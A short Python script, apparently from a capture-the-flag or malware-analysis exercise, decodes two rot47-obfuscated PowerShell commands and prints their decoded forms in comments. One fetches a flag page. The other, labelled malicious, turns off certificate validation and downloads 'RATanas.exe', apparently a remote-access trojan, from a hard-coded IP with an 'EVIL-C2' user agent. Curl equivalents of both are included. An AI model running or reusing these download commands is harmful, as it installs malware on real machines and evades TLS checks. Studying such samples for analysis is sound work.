#!/usr/bin/env python3
# DarkSide
# xen was here
# https://rot47.net/

import os

def rot47(s):
    flag = ''
    for i in range(len(s)):
        if(ord(s[i])>=33 and ord(s[i])<80):
            flag+=chr(ord(s[i])+47)
        if(ord(s[i])>=80 and ord(s[i])<127):
            flag+=chr(ord(s[i])-47)
    return flag

flag_rot47  = 'A@H6CD96== \4@>>2?5 Q,$JDE6>]}6E]$6CG:46!@:?E|2?286C.ii$6CG6Cr6CE:7:42E6\'2=:52E:@?r2==324< l LSECF6Nj SH63 l }6H\~3;64E $JDE6>]}6E](63r=:6?EjSH63]w6256CD,V&D6C\p86?EV. l VelphishingeslomaximoVjS7=28 l SH63]s@H?=@25$EC:?8WV9EEADi^^da]bb]`ba]`ehi`cce^7=28]9E>=VXj SD9 l }6H\~3;64E \r@>~3;64E Q(D4C:AE]$96==Qj S:?EqFEE@? l SD9]!@AFAWS7=28[a[Qu{pvQ[_ZecXQ'
malicious_rot47 = 'A@H6CD96== \4@>>2?5 Q,$JDE6>]}6E]$6CG:46!@:?E|2?286C.ii$6CG6Cr6CE:7:42E6\'2=:52E:@?r2==324< l LSECF6Nj SH63 l }6H\~3;64E $JDE6>]}6E](63r=:6?EjSH63]w6256CD,V&D6C\p86?EV. l Vt\'x{\raVjSH63]s@H?=@25u:=6WV9EEADi^^da]bb]`ba]`ehi`cce^#p%2?2D]6I6V[ V#p%2?2D]6I6VXQ'

print(rot47(flag_rot47))
# powershell -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $web = New-Object System.Net.WebClient;$web.Headers['User-Agent'] = '6=A9:D9:?86D=@>2I:>@';$flag = $web.DownloadString('https://52.33.132.169:1446/flag.html'); $sh = New-Object -ComObject "Wscript.Shell"; $intButton = $sh.Popup($flag,2,"FLAG",0+64)"
# os.system('curl -k -H \'USER-AGENT: elphishingeslomaximo\' https://52.33.132.169:1446/flag.html')

print(rot47(malicious_rot47))
# powershell -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $web = New-Object System.Net.WebClient;$web.Headers['User-Agent'] = 'EVIL-C2';$web.DownloadFile('https://52.33.132.169:1446/RATanas.exe', 'RATanas.exe')"
# os.system('curl -k -H \'USER-AGENT: EVIL-C2\' https://52.33.132.169:1446/RATanas.exe --output Ratanas.exe')


